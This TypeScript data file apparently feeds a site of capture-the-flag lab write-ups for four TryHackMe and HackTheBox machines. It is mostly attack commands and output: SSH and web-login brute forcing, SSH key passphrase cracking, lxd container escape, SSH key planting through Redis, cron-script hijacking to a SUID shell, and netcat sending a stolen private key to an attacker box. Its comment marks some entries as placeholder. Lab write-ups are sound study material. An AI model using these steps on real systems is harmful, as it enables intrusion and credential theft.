// "gaming-server" and "basic-pentesting" are real, condensed writeups.
// Everything else in this file is still placeholder content used to
// design the layout, pending conversion from raw notes.

export type MachinePhase = {
  title: string;
  body: string;
};

export type Machine = {
  slug: string;
  name: string;
  platform: "HackTheBox" | "TryHackMe";
  difficulty: "Easy" | "Medium" | "Hard";
  os: "Linux" | "Windows";
  date: string;
  tags: string[];
  summary: string;
  phases: MachinePhase[];
};

export const machines: Machine[] = [
  {
    slug: "gaming-server",
    name: "Gaming Server",
    platform: "TryHackMe",
    difficulty: "Medium",
    os: "Linux",
    date: "2026-01-30",
    tags: [
      "nmap",
      "gobuster",
      "source-disclosure",
      "ssh-key-crack",
      "john",
      "lxd-privesc",
    ],
    summary:
      "A TryHackMe Linux box where a leaked upload-handler source and a passphrase-protected SSH key lead to a foothold, and lxd group membership finishes the job.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap 10.48.153.3
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
\`\`\`

\`\`\`shell
$ nmap -p 22,80 -sV -T4 10.48.153.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
\`\`\`

\`\`\`shell
$ gobuster dir -u http://10.48.153.3 -w DirBuster-2007_directory-list-lowercase-2.3-small.txt -x php,html,txt
index.html    (Status: 200)
about.html    (Status: 200)
about.php     (Status: 200)
uploads       (Status: 301)
robots.txt    (Status: 200)
secret        (Status: 301)
myths.html    (Status: 200)
\`\`\`

\`robots.txt\` doesn't hide anything &mdash; it points straight at
\`/uploads/\`:

\`\`\`text
user-agent: *
Allow: /
/uploads/
\`\`\`
`,
      },
      {
        title: "Enumeration",
        body: `The site itself is a fantasy-game landing page with nothing useful in
the nav &mdash; everything interesting is off the beaten path.

![Home page of the target site, a fantasy game landing page called Draagan](/writeups/gaming-server/enum-target-homepage.png)

\`robots.txt\` doesn't hide anything &mdash; it points straight at
\`/uploads/\`:

\`\`\`text
user-agent: *
Allow: /
/uploads/
\`\`\`

![robots.txt served in the browser, listing /uploads/](/writeups/gaming-server/enum-robots-txt.png)

Both \`/uploads/\` and \`/secret/\` have directory listing enabled.

![Directory listing for /uploads/ showing dict.lst, manifesto.txt, and meme.jpg](/writeups/gaming-server/enum-uploads-listing.png)

\`/uploads/\` has \`dict.lst\` (a candidate password list), \`manifesto.txt\`
(nothing useful), and \`meme.jpg\`. The image turned out to be a
\`steghide\`-protected red herring &mdash; \`stegseek\` against it with
\`dict.lst\` came up empty:

![stegseek --crack against meme.jpg failing to find a valid passphrase](/writeups/gaming-server/enum-stegseek-fail.png)

![Directory listing for /secret/ showing a single file, secretKey](/writeups/gaming-server/enum-secret-listing.png)

\`/secret/\` has a single file, \`secretKey\`, which turns out to be a
passphrase-protected RSA private key:

\`\`\`shell
$ wget http://10.48.153.3/secret/secretKey
$ cat secretKey
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
...
-----END RSA PRIVATE KEY-----
\`\`\`

Viewing the homepage source turns up a username in an HTML comment:

![HTML source comment addressed to john about placeholder content](/writeups/gaming-server/enum-html-comment-username.png)

\`\`\`html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
\`\`\`

\`about.php\` renders the same page as \`about.html\` but adds a file
upload form:

![about.php page rendered in the browser with a file upload form](/writeups/gaming-server/enum-about-php-upload-form.png)

Intercepting a request to it in Burp caught one response that leaked
the handler's raw PHP source instead of executing it:

![Burp Suite response tab showing the leaked PHP source of the upload handler](/writeups/gaming-server/enum-burp-leaked-source.png)

\`\`\`php
<?php
  if(isset($_FILES['image'])){
    $errors = array();
    $file_name = $_FILES['image']['name'];
    ...
    $file_ext = strtolower(end(explode('.',$FILES['image']['name'])));

    $expensions = array('jpeg', 'jpg', 'png', 'php');

    if(in_array($file_ext,$expensions)=== false){
      $errors[] = "extension not allowed, please choose a different file type.";
    }

    if(empty($errors) == true){
      move_uploaded_file($file_tmp,"uploads/".$filename);
      echo "Success";
    }else{
      print_r($errors);
    }
  }
?>
\`\`\`

Two bugs in six lines: the extension check reads \`$FILES\` instead of
\`$_FILES\` (so \`$file_ext\` is always empty), and the move step writes
\`$filename\` &mdash; a variable that's never defined &mdash; instead of
\`$file_name\`. \`.php\` is technically in the whitelist, but the upload
can never actually land. Confirmed by trying: a PHP reverse shell
uploads with no error, and never shows up under \`/uploads/\`.`,
      },
      {
        title: "Foothold",
        body: `A first attempt at \`john\` over SSH just asks for a password that
neither wordlist nor the raw key can satisfy:

![SSH prompting for john's password with the host key not yet trusted](/writeups/gaming-server/foothold-ssh-password-prompt.png)

With the upload path dead, \`john\` plus the leaked \`dict.lst\` is the
way in &mdash; but not against SSH directly:

\`\`\`shell
$ hydra -l john -P dict.lst 10.48.153.3 ssh -t 4
1 of 1 target completed, 0 valid password found
\`\`\`

Trying \`secretKey\` as the identity file just moves the same problem to
its passphrase:

![SSH repeatedly rejecting the passphrase for secretKey](/writeups/gaming-server/foothold-ssh-key-passphrase-fail.png)

The private key's passphrase is a better target for the same wordlist,
cracked offline instead of over the wire:

\`\`\`shell
$ ssh2john secretKey > keysecret.txt
$ john -w dict.lst keysecret.txt --format=ssh
letmein          (secretKey)
\`\`\`

![john cracking secretKey's passphrase as "letmein"](/writeups/gaming-server/foothold-john-crack-passphrase.png)

\`\`\`shell
$ chmod 600 secretKey
$ ssh -i secretKey john@10.48.153.3
Enter passphrase for key 'secretKey': letmein
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
\`\`\`

![Logged in over SSH as john, dropped to a shell prompt](/writeups/gaming-server/foothold-ssh-login-success.png)

![whoami confirming the shell belongs to john](/writeups/gaming-server/foothold-whoami-john.png)`,
      },
      {
        title: "Privilege escalation",
        body: `\`john\` is in the \`sudo\` group, but only \`sudo\` with the account's
actual login password works &mdash; which isn't known, only the SSH key
is:

\`\`\`shell
$ sudo -l
[sudo] password for john:
Sorry, try again.
\`\`\`

![sudo -l and sudo -i both rejecting john's unknown password](/writeups/gaming-server/privesc-sudo-fail.png)

The more interesting group from \`id\` is \`lxd\`:

![id showing john's group membership, including lxd](/writeups/gaming-server/privesc-id-lxd-group.png)

\`linpeas\` flags it directly, and it's a well-known container-escape
path documented on GTFOBins:

![linpeas highlighting john's sudo and lxd group membership](/writeups/gaming-server/privesc-linpeas-lxd.png)

![GTFOBins' lxd entry showing the image-build-and-mount escape](/writeups/gaming-server/privesc-gtfobins-lxd.png)

Since no base image is present on the box yet, build one locally with
[lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) and
serve it over HTTP:

\`\`\`shell
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ sudo ./build-alpine -a i686
$ python3 -m http.server 8000
\`\`\`

![Cloning lxd-alpine-builder on the attacker box](/writeups/gaming-server/privesc-alpine-builder-clone.png)

![The built Alpine image tarball ready to serve](/writeups/gaming-server/privesc-alpine-image-built.png)

Pull it onto the target:

![wget pulling the Alpine image tarball onto the target](/writeups/gaming-server/privesc-image-transferred.png)

...import it, and launch a privileged container with the host
filesystem mounted in:

\`\`\`shell
$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
$ lxc init myimage ignite -c security.privileged=true
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start ignite
$ lxc exec ignite /bin/sh
$ id
uid=0(root) gid=0(root)
\`\`\`

![Root shell inside the privileged LXD container](/writeups/gaming-server/privesc-root-shell.png)

The container's own \`/root\` is just the fresh Alpine image's empty
home directory &mdash; **the real host filesystem is mounted at**
\`/mnt/root\` because of the device added above, so that's where the
loot actually lives:

![Navigating from the container's /root to the mounted host filesystem under /mnt](/writeups/gaming-server/privesc-searching-for-flag.png)

![root.txt located under /mnt/root, the mounted host filesystem](/writeups/gaming-server/privesc-root-flag-location.png)
`,
      },
    ],
  },
  {
    slug: "basic-pentesting",
    name: "Basic Pentesting",
    platform: "TryHackMe",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-07-03",
    tags: [
      "nmap",
      "smb",
      "ffuf",
      "hydra",
      "ssh-key-crack",
      "john",
      "lateral-movement",
    ],
    summary:
      "A TryHackMe Linux box where an HTTP dev-notes leak and anonymous SMB access surface two usernames, a brute-forced SSH password gets a foothold as one of them, and a world-readable SSH key leads to lateral movement into the other.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap -p- -T4 -sV -sC -oN nmap 10.49.191.54
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
\`\`\`

Two SMB ports alongside SSH and a stock Apache/Tomcat pair &mdash; SMB is
most likely an attack vector.`,
      },
      {
        title: "Enumeration",
        body: `The port 80 site is just a placeholder, but its HTML source hints at
where the real content lives:

![Homepage showing an "Undergoing maintenance" placeholder message](/writeups/basic-pentesting/enum-http-homepage.png)

\`\`\`html
<!-- Check our dev note section if you need to know what to work on. -->
\`\`\`

![Page source revealing the HTML comment about a dev note section](/writeups/basic-pentesting/enum-http-view-source.png)

Fuzzing for that "dev note section" turns up \`/development\`:

\`\`\`shell
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.49.191.54/FUZZ -e .html
development             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 30ms]
\`\`\`

![Directory listing for /development showing dev.txt and j.txt](/writeups/basic-pentesting/enum-development-listing.png)

Both files are internal dev notes, and name two users right away:

\`\`\`text
For J:

I've been auditing the contents of /etc/shadow to make sure we don't
have any weak credentials, and I was able to crack your hash really
easily. You know our password policy, so please follow it? Change
that password ASAP.

-K
\`\`\`

![j.txt: K warning J about a weak, easily-cracked password](/writeups/basic-pentesting/enum-development-jtxt.png)

\`\`\`text
2018-04-23: I've been messing with that struts stuff, and it's pretty
cool! ... using version 2.5.12, because other versions were giving me
trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
\`\`\`

![dev.txt: K and J's dev log, confirming SMB is configured](/writeups/basic-pentesting/enum-development-devtxt.png)

With SMB confirmed live, anonymous access is the next thing to check:

\`\`\`shell
$ smbclient -N -L //10.49.184.181
Sharename       Type      Comment
Anonymous       Disk
IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)

$ smbclient -U kay //10.49.184.181/Anonymous
Password for [WORKGROUP\\kay]:
smb: \\> ls
staff.txt
smb: \\> get staff.txt
\`\`\`

![smbclient listing the Anonymous share and pulling staff.txt](/writeups/basic-pentesting/enum-smb-anonymous-listing.png)

\`staff.txt\` names the second user and a target for a password guess:

\`\`\`text
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know
it's all in fun, but this is how mistakes happen. (This means you
too, Jan!)

-Kay
\`\`\`

![staff.txt: Kay calling out Jan for uploading non-work files](/writeups/basic-pentesting/enum-smb-stafftxt.png)

Between the dev notes (K, J) and the staff announcement (Kay, addressed
to Jan), two real usernames fall out: \`kay\` and \`jan\`.`,
      },
      {
        title: "Foothold",
        body: `With a valid username and no working password yet, \`hydra\` against SSH
is the next move:

\`\`\`shell
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.49.184.181 ssh
[22][ssh] host: 10.49.184.181   login: jan   password: armando
\`\`\`

![hydra finding jan's SSH password as "armando"](/writeups/basic-pentesting/foothold-hydra-ssh-crack.png)

\`\`\`shell
$ ssh jan@10.48.156.54
jan@10.48.156.54's password: armando
Welcome to Ubuntu 20.04.6 LTS
\`\`\`

![Logged in over SSH as jan](/writeups/basic-pentesting/foothold-ssh-login-jan.png)

jan's own home directory is empty aside from an unreadable \`.lesshst\`,
so the next stop is the other user found during enumeration:

\`\`\`shell
jan@ip-10-48-156-54:~$ cd ..
jan@ip-10-48-156-54:/home$ ls
jan  kay  ubuntu
jan@ip-10-48-156-54:/home$ cd kay
jan@ip-10-48-156-54:/home/kay$ ls -la
-rw------- 1 kay  kay    57 pass.bak
drwxr-xr-x 2 kay  kay  4096 .ssh
\`\`\`

![Poking around jan's home directory, then kay's](/writeups/basic-pentesting/foothold-jan-home-enum.png)

![Directory listing for kay's home, showing pass.bak and .ssh](/writeups/basic-pentesting/foothold-kay-home-listing.png)

\`pass.bak\` is unreadable as jan, but \`.ssh\` isn't, and its private key
is sitting there world-readable:

\`\`\`shell
jan@ip-10-48-156-54:/home/kay$ cd .ssh
jan@ip-10-48-156-54:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
\`\`\`

![Reading kay's world-readable id_rsa from jan's shell](/writeups/basic-pentesting/foothold-kay-ssh-key-leak.png)`,
      },
      {
        title: "Lateral movement",
        body: `The key is passphrase-protected, so it needs to come back to the
attacking box to crack offline. Netcat moves it over:

\`\`\`shell
# on the target, as jan
$ nc 192.168.151.91 1234 < id_rsa

# on the attacker box
$ nc -lvnp 1234 > id_rsa
$ chmod 600 id_rsa
\`\`\`

![Netcat pulling id_rsa across and chmod-ing it locally](/writeups/basic-pentesting/lateral-netcat-key-transfer.png)

\`\`\`shell
$ ssh kay@10.48.156.54 -i id_rsa
Enter passphrase for key 'id_rsa':
\`\`\`

![SSH prompting for id_rsa's passphrase, confirming it's protected](/writeups/basic-pentesting/lateral-ssh-key-passphrase-prompt.png)

Same offline-crack approach as the earlier SSH key &mdash; \`ssh2john\`
plus \`john\` against \`rockyou.txt\`:

\`\`\`shell
$ ssh2john id_rsa > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
beeswax          (id_rsa)
\`\`\`

![john cracking id_rsa's passphrase as "beeswax"](/writeups/basic-pentesting/lateral-john-crack-passphrase.png)

\`\`\`shell
$ ssh kay@10.48.143.202 -i id_rsa
Enter passphrase for key 'id_rsa': beeswax
kay@ip-10-48-143-202:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
\`\`\`

![Logged in over SSH as kay using the cracked key](/writeups/basic-pentesting/lateral-ssh-login-kay.png)

![cat pass.bak revealing the box's final password](/writeups/basic-pentesting/lateral-final-password.png)

\`pass.bak\` in kay's home directory holds the box's final password
&mdash; the thing K's dev-note comment about auditing \`/etc/shadow\` and
Jan's own leaked password were ultimately pointing at.`,
      },
    ],
  },
  {
    slug: "ledger",
    name: "Ledger",
    platform: "HackTheBox",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-03-02",
    tags: ["redis", "ssh-keys", "cron"],
    summary:
      "An easy Linux box with an unauthenticated Redis instance that's abused to plant an SSH key, then a root cron job that finishes the job. Placeholder writeup used to design this section's layout.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap -p- -T4 10.10.71.9
PORT     STATE SERVICE
22/tcp   open  ssh
6379/tcp open  redis
\`\`\`

Redis with no auth configured:

\`\`\`shell
$ redis-cli -h 10.10.71.9 ping
PONG
$ redis-cli -h 10.10.71.9 config get requirepass
1) "requirepass"
2) ""
\`\`\`

An open, unauthenticated Redis instance is enough on its own &mdash; the
next step is turning read/write access into code execution.`,
      },
      {
        title: "Foothold",
        body: `Redis can write arbitrary files, so the standard move is to write an
SSH public key into a user's \`authorized_keys\`:

\`\`\`shell
$ (echo -e "\\n\\n"; cat id_rsa.pub; echo -e "\\n\\n") > key.txt
$ redis-cli -h 10.10.71.9 flushall
$ cat key.txt | redis-cli -h 10.10.71.9 -x set ssh_key
$ redis-cli -h 10.10.71.9 config set dir /home/ledger/.ssh
$ redis-cli -h 10.10.71.9 config set dbfilename authorized_keys
$ redis-cli -h 10.10.71.9 save
\`\`\`

\`\`\`shell
$ ssh -i id_rsa ledger@10.10.71.9
ledger@ledger:~$ id
uid=1000(ledger) gid=1000(ledger) groups=1000(ledger)
\`\`\`

Grab the user flag from \`/home/ledger/user.txt\`.`,
      },
      {
        title: "Privilege escalation",
        body: `\`/etc/crontab\` is world-readable and shows a root cron job running a
script the \`ledger\` user can write to:

\`\`\`shell
$ cat /etc/crontab
* * * * * root /opt/ledger/sync.sh
$ ls -la /opt/ledger/sync.sh
-rwxrwxr-x 1 root ledger /opt/ledger/sync.sh
\`\`\`

Append a reverse shell (or SUID bash copy) to the script and wait for the
next minute's run:

\`\`\`shell
$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/ledger/sync.sh
$ sleep 60 && /tmp/rootbash -p
rootbash-5.1# whoami
root
\`\`\`
`,
      },
      {
        title: "Loot",
        body: `**User flag:** \`HTB{placeholder_user_flag_ledger}\`

**Root flag:** \`HTB{placeholder_root_flag_ledger}\`
`,
      },
    ],
  },
  {
    slug: "checkmate",
    name: "Checkmate",
    platform: "TryHackMe",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-07-12",
    tags: ["hydra", "cewl", "cupp", "hashcat", "http-brute-force"],
    summary:
      "A TryHackMe challenge that chains five escalating password attacks — hydra default-cred brute force, a CeWL site wordlist, a cupp OSINT profile, a cracked hashcat hash, and a rule-mangled wordlist to finally brute-force SSH.",
    phases: [
      {
        title: "Recon",
        body: `[Checkmate](https://tryhackme.com/room/checkmate) is a TryHackMe
challenge framed as an internal security assessment of one employee, Marco
Bianchi, across five levels of increasingly personal password attacks. The
landing app on port 5000 briefs all five and is explicit that it's off
limits itself:

![Operation Checkmate landing page, framed as an internal password audit of Marco Bianchi, with Level 1 selected](/writeups/checkmate/recon-landing-brief.png)

> Focus on the intended techniques and clues provided throughout the room.
> Blind brute-forcing against this main application on port 5000 is out of
> scope and may trigger a temporary cooldown.

Clicking through the other tabs names the real targets: \`firewall.thm:5001\`
(Level 1), \`jobs.thm:5002\` (Level 2), and \`social.thm:5003\` (Levels 3 and
4, plus the SSH service behind it for Level 5). All three resolve to the
same host, so they go straight into \`/etc/hosts\`:

\`\`\`shell
$ echo "10.49.189.54 firewall.thm jobs.thm social.thm" | sudo tee -a /etc/hosts
\`\`\`

Each level is gated behind the one before it, so the plan is to work
through them in order.`,
      },
      {
        title: "Level 1 — Firewall",
        body: `\`firewall.thm:5001\` is a FirewallOS management console. The brief says
Marco "kept default credentials," and the login form obligingly pre-fills
\`admin\` as the username:

![FirewallOS sign-in page with the admin username pre-filled and a masked password field](/writeups/checkmate/level1-login-portal.png)

Default/default doesn't work, so the actual password still needs
brute-forcing. Intercepting a login attempt in Burp confirms the exact
endpoint and parameter names to target:

![Burp Suite intercepting a POST /login request with username=admin&password=admin](/writeups/checkmate/level1-burp-login-request.png)

\`\`\`text
POST /login HTTP/1.1
Host: firewall.thm:5001
...
username=admin&password=admin
\`\`\`

That's everything \`hydra\`'s \`http-post-form\` module needs:

\`\`\`shell
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt firewall.thm http-post-form -s 5001 "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
[5001][http-post-form] host: firewall.thm   login: admin   password: 12345
1 of 1 target successfully completed, 1 valid password found
\`\`\`

![hydra cracking the FirewallOS login as admin:12345](/writeups/checkmate/level1-hydra-crack.png)

\`admin\` / \`12345\` logs straight into the dashboard &mdash; Level 1's password
is \`12345\`.

![FirewallOS dashboard after logging in as admin, showing firewall policies and a "Secure internal employee portal next" reminder](/writeups/checkmate/level1-dashboard-success.png)`,
      },
      {
        title: "Level 2 — Jobs",
        body: `The dashboard's own reminder points at the next target: \`jobs.thm:5002\`,
an "Engineering Careers" site with an Employee Login panel tucked behind
it.

![Engineering Careers homepage on jobs.thm, listing featured roles and company keyword tags like innovation, excellence, and security](/writeups/checkmate/level2-careers-homepage.png)

![Employee Login form with the username pre-filled as marco and a masked password field](/writeups/checkmate/level2-employee-login.png)

The username this time is \`marco\`, not \`admin\` &mdash; worth noting after
wasting a few attempts assuming otherwise. The Level 2 brief says Marco
"used common company keywords as passwords," which means \`rockyou.txt\`
is the wrong wordlist entirely; the real one has to come from the site
itself. \`cewl\` scrapes it directly:

\`\`\`shell
$ cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emailfile -w wordsfile http://jobs.thm:5002
$ wc -l wordsfile
98 wordsfile
\`\`\`

![CeWL crawling jobs.thm two links deep and saving 98 words to a wordlist](/writeups/checkmate/level2-cewl-wordlist-gen.png)

\`\`\`text
security
excellence
careers
apply
full
time
cloud
engineering
digital
innovation
\`\`\`

![First lines of the CeWL-generated wordlist: security, excellence, careers, apply, and more](/writeups/checkmate/level2-cewl-wordlist-sample.png)

\`\`\`shell
$ hydra -l marco -P wordsfile jobs.thm http-post-form -s 5002 "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
[5002][http-post-form] host: jobs.thm   login: marco   password: excellence
1 of 1 target successfully completed, 1 valid password found
\`\`\`

![hydra cracking the Employee Login as marco:excellence using the CeWL wordlist](/writeups/checkmate/level2-hydra-crack.png)

Level 2's password is \`excellence\`. Logging in as marco reaches an Employee
Profile page &mdash; full name Marco Bianchi, nickname \`marky\`, birthdate
\`14021995\` &mdash; personal details that turn out to matter for the next
level.

![Employee Profile page for Marco Bianchi showing his nickname "marky" and birthdate 14021995](/writeups/checkmate/level2-employee-profile.png)`,
      },
      {
        title: "Level 3 — Social",
        body: `\`social.thm:5003\` is a social-network clone, and its login page drops a
direct hint about where the next password comes from:

![social.thm login page with the hint "Use the details from jobs.thm to generate Marco's password"](/writeups/checkmate/level3-social-login.png)

That's an OSINT-style profiling attack, and [cupp](https://github.com/Mebus/cupp)
is built exactly for turning a target's personal details into a
candidate wordlist:

\`\`\`shell
$ git clone https://github.com/Mebus/cupp.git
$ cd cupp
$ ./cupp.py -i
\`\`\`

![Cloning cupp from GitHub and starting it in interactive profiling mode](/writeups/checkmate/level3-cupp-clone.png)

Feeding it Marco's details from the employee profile &mdash; first name,
surname, nickname, and birthdate &mdash; plus the company keywords CeWL
already scraped in Level 2 as extra seed words:

\`\`\`text
> First Name: Marco
> Surname: Bianchi
> Nickname: marky
> Birthdate (DDMMYYYY): 14021995
...
> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma: security,excellence,innovation,digital,cloud
\`\`\`

![cupp's interactive prompts asking for Marco's name, nickname, and birthdate](/writeups/checkmate/level3-cupp-interactive-start.png)

\`\`\`text
[+] Saving dictionary to marco.txt, counting 4468 words.
\`\`\`

![cupp finishing and saving a 4,468-word dictionary to marco.txt](/writeups/checkmate/level3-cupp-wordlist-generated.png)

\`\`\`shell
$ hydra -l marco -P marco.txt social.thm http-post-form -s 5003 "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
[5003][http-post-form] host: social.thm   login: marco   password: Bianchi2495
1 of 1 target successfully completed, 1 valid password found
\`\`\`

![hydra cracking the social.thm login as marco:Bianchi2495 using the cupp-generated wordlist](/writeups/checkmate/level3-hydra-crack.png)

Level 3's password is \`Bianchi2495\` &mdash; his surname plus his birthdate's
day and year digits, exactly the kind of pattern cupp is designed to
guess. Logged in as marco, his own feed turns out to hold the key to
Level 5: a post spelling out his password formula in plain text.

![Marco's social.thm feed, including a post explaining his password formula: capitalize a company keyword, append a number, add an exclamation mark](/writeups/checkmate/level3-social-feed-loggedin.png)`,
      },
      {
        title: "Level 4 — Hash cracking",
        body: `Still on \`social.thm:5003\`, Level 4 is a file-recovery puzzle rather than
a login form. Marco recently uploaded a new profile picture, and the
platform stores uploads as \`sha256(original_filename).png\` &mdash; the task
is to recover that original filename from the hash alone.

![Level 4 brief: the platform renames uploads to their SHA256 hash, and the task is to recover the original filename](/writeups/checkmate/level4-brief.png)

The uploaded picture itself is reachable directly, and its filename in the
URL bar is the hash to crack:

\`\`\`text
http://social.thm:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
\`\`\`

![The uploaded profile picture, served at a URL whose filename is a SHA256 hash](/writeups/checkmate/level4-profile-picture-hash.png)

\`hashid\` confirms it's a plain SHA-256:

\`\`\`shell
$ echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash
$ hashid -m -j hash
[+] SHA-256 [Hashcat Mode: 1400][JtR Format: raw-sha256]
\`\`\`

![hashid identifying the hash as SHA-256, Hashcat mode 1400](/writeups/checkmate/level4-hashid-identify.png)

\`\`\`shell
$ hashcat -m 1400 -a 0 hash /usr/share/wordlists/rockyou.txt
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:family
\`\`\`

![hashcat cracking the SHA256 hash to recover the original filename "family"](/writeups/checkmate/level4-hashcat-result.png)

The original filename &mdash; and Level 4's password &mdash; is \`family\`.`,
      },
      {
        title: "Level 5 — Password rule & SSH",
        body: `Level 5 doesn't need a new vulnerability, just the password formula Marco
already leaked on his own feed back in Level 3:

![Marco's post: "My tip for strong password: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark"](/writeups/checkmate/level5-password-rule-post.png)

That rule, combined with the company-keyword wordlist CeWL already
scraped in Level 2, is enough to build a targeted wordlist by hand. First,
capitalize the first letter of every word:

\`\`\`shell
$ sed -i 's/./\\U&/' wordsfile.txt
\`\`\`

Or the same thing in Python, for anyone who'd rather not fight \`sed\`'s
case-conversion syntax:

\`\`\`python
with open("wordsfile.txt") as f:
    lines = f.readlines()
with open("wordsfile.txt", "w") as f:
    for line in lines:
        f.write(line[:1].upper() + line[1:])
\`\`\`

![Wordlist words capitalized: Security, Excellence, Careers, Apply, and more](/writeups/checkmate/level5-wordlist-capitalized.png)

Then a small loop appends every 4-digit number in a plausible range plus
a trailing \`!\` to each capitalized word:

\`\`\`shell
$ for i in $(cat wordsfile.txt); do
    for j in $(seq 2000 2100); do
        echo "\${i}\${j}!";
    done
done > rulewords.txt
\`\`\`

![Running the wordlist-mangling script to build rulewords.txt](/writeups/checkmate/level5-rule-script-run.png)

\`\`\`shell
$ hydra -l marco -P rulewords.txt social.thm ssh
[22][ssh] host: social.thm   login: marco   password: Security2024!
1 of 1 target successfully completed, 1 valid password found
\`\`\`

![hydra brute-forcing SSH and cracking marco's password as Security2024!](/writeups/checkmate/level5-hydra-ssh-crack.png)

\`Security2024!\` &mdash; exactly the rule Marco described, applied to one of
his own company's keywords &mdash; gets SSH access as marco and closes out
all five levels.`,
      },
    ],
  },
];

export function getMachine(slug: string): Machine | undefined {
  return machines.find((m) => m.slug === slug);
}

export function machinesByPlatform(platform: Machine["platform"]): Machine[] {
  return machines.filter((m) => m.platform === platform);
}

// URL segment for each platform, e.g. /writeups/tryhackme, /writeups/hackthebox
export const PLATFORM_ROUTES = {
  TryHackMe: "tryhackme",
  HackTheBox: "hackthebox",
} as const;

export function platformSlug(platform: Machine["platform"]): string {
  return PLATFORM_ROUTES[platform];
}
